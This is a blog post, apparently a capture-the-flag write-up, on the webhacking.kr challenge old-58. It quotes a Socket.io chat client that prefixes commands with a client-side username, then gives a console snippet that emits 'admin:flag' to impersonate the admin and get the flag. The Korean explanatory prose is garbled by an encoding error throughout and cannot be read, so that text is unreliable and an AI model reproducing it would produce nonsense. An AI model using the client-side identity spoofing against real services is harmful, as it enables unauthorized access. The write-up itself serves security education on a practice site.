---
title: '[Wargame] Webhacking.kr old-58 (Javascript)'
date: 2024-03-02 00:00:00
categories: [Wargame, webhacking.kr]
tags: [webhacking, webhacking.kr]
published: True
---

## π© λ¬Έμ  νμ•…

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/e51a397e-16fa-4004-a6b6-28169eee9988)

λ¬Έμ μ— μ ‘μ†ν•λ©΄ μ±„ν…μ°½ λ¨μµμ„ ν™•μΈν•  μ μλ‹¤. μ•„λ¬΄ κ°’μ„ μ…λ ¥ν•λ‹ λ…λ Ήμ–΄λ¥Ό μ°Ύμ„ μ μ—†λ” λ¬Έκµ¬λ¥Ό ν™•μΈν•  μ μλ” κ²ƒμΌλ΅ λ³΄μ•„ CLIλ¥Ό κµ¬ν„ν•΄ λ†“μ€ κ²ƒμΌλ΅ μ μ¶”ν•  μ μλ‹¤.

<br>

`help` λ…λ Ήμ–΄λ¥Ό μ…λ ¥ν•λ‹ μ‚¬μ©κ°€λ¥ν• λ…λ Ήμ–΄λ¥Ό ν™•μΈν•  μ μμ—κ³ , λ‹¤λ¥Έ λ…λ Ήμ–΄λ¥Ό μ‹¤ν–‰ν• κ²°κ³Ό μ„μ™€ κ°™μ€ μ‘λ‹µμ„ ν™•μΈν•  μ μλ‹¤.

`id` λ…λ Ήμ–΄λ¥Ό ν†µν•΄ ν„μ¬ μ‚¬μ©μκ°€ admin κ¶ν•μ„ κ°€μ§€κ³  μλ” κ²ƒμ„ ν™•μΈν•μ€μΌλ‚, `flag` λ…λ Ήμ–΄λ¥Ό μ‚¬μ©ν•  μ μ—†λ” κ²ƒμ„ ν™•μΈν•  μ μλ‹¤.

μ†μ¤μ½”λ“λ¥Ό ν™•μΈν•΄λ³΄μ.

<br>

```javascript
$(function () {
    var username = "guest";
    var socket = io();
    $('form').submit(function(e){
    e.preventDefault();
    socket.emit('cmd',username+":"+$('#m').val());
    $('#m').val('');
    return false;
    });
    socket.on('cmd', function(msg){
    $('#messages').append($('<li>').text(msg));
    });
});
```

`script` νƒκ·Έ λ‚΄μ—μ„ μ„μ™€ κ°™μ€ javascript μ½”λ“λ¥Ό ν™•μΈν•  μ μμ—λ‹¤. ν•΄λ‹Ή μ¤ν¬λ¦½νΈμ μ—­ν• μ„ λ¶„μ„ν•λ©΄ λ‹¤μκ³Ό κ°™λ‹¤.

1. `var socket = io();`

    μ„ λ…λ Ήμ„ ν†µν•΄ **Socket.io** λ¨λ“μ„ μ‚¬μ©ν•λ‹¤. Socket.ioλ” node.js κΈ°λ° μ‹¤μ‹κ°„ μ›Ή μ• ν”λ¦¬μΌ€μ΄μ… μ§€μ› λΌμ΄λΈλ¬λ¦¬λ΅, μ‹¤μ‹κ°„ μ±„ν…μ„ κµ¬ν„ν•  λ• μ‚¬μ©λλ‹¤.

2. `socket.emit('cmd',username+":"+$('#m').val());`

    socket.emit λ…λ Ήμ–΄λ” μ„λ²„ μ½μ—μ„ eventλ¥Ό λ°μƒμ‹ν‚¤λ” ν•¨μλ΅, μ²« λ²μ§Έ μΈμλ” eventμ μ΄λ¦„μ„, λ‘ λ²μ§Έ μΈμλ΅λ” ν•΄λ‹Ή μ†μΌ“μ„ ν†µν•΄ ν΄λΌμ΄μ–ΈνΈμ—κ² λ©”μ‹μ§€λ¥Ό μ „λ‹¬ν•λ‹¤.
    μ‚¬μ©μκ°€ μ…λ ¥ν• κ°’μ„ cmd λ…λ Ήμ–΄λ΅ μ‹¤ν–‰ν•λ‹¤. μ΄λ•, username λ³€μ κ°’μ„ λ…λ Ή μ•μ— λ¶™μ—¬ μ‚¬μ©ν•λ”λ° μ΄λ” ν•΄λ‹Ή μ‚¬μ©μμ κ¶ν•μΌλ΅ λ…λ Ήμ–΄λ¥Ό μ‹¤ν–‰ν•¨μ„ μλ―Έν•λ‹¤. μ—¬κΈ°μ„ username λ³€μ κ°’μ€ 'guest'λ΅ λμ–΄μλ‹¤.

3. `socket.on('cmd', function(msg){ $('#messages').append($('<li>').text(msg)); });`

    socket.on λ…λ Ήμ–΄λ” μ²« λ²μ§Έ μΈμλ΅ λ°›μ€ eventκ°€ ν΄λΌμ΄μ–ΈνΈμ—μ„ emit λλ©΄, λ‘ λ²μ§Έ μΈμλ΅ λ°›μ€ μ½λ°± ν•¨μλ¥Ό μ‹¤ν–‰ν•λ‹¤. μ‘λ‹µμ„ μμ‹ ν•λ” κΈ°λ¥μΌλ΅ μ„μ—μ„ μ „λ‹¬ν• λ…λ Ήμ–΄λ¥Ό μ‹¤ν–‰ν• κ²°κ³Ό κ°’μ„ μ¶λ ¥ν•λ” μ—­ν• μ„ ν•λ‹¤.


<br>

μ°λ¦¬λ” socket ν†µμ‹ μ„ ν†µν•΄ adminμΌλ΅ flag λ…λ Ήμ–΄λ¥Ό μ‹¤ν–‰ν•κ³  κ²°κ³Ό κ°’μ„ μμ‹  λ°›μΌλ©΄ λλ” λ¬Έμ μ΄λ‹¤.

---

<br><br>


## π© λ¬Έμ  ν’€μ΄

---

```javascript
var socket = io();  // μ†μΌ“ ν†µμ‹ μ„ μ‹μ‘

socket.emit('cmd','admin:flag');  // cmd μ΄λ²¤νΈλ΅ admin:flagλ¥Ό μ‹¤ν–‰ν•λ„λ΅ ν•λ‹¤
socket.on('cmd', function(res) {console.log(res)});  // cmd λ…λ Ή μ‹¤ν–‰ κ°’μ„ μ½μ†” μ°½μ— μ¶λ ¥ν•λ‹¤.
```

μ½μ†” μ°½μ—μ„ μ„μ μ½”λ“λ¥Ό μ‹¤ν–‰ν•λ‹¤.

<br>

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/e454d185-a177-45ad-8a0f-67adad24bc0e)

κ·ΈλΌ μ„μ™€ κ°™μ΄ flag κ°’μ„ νλ“ν•  μ μλ‹¤!


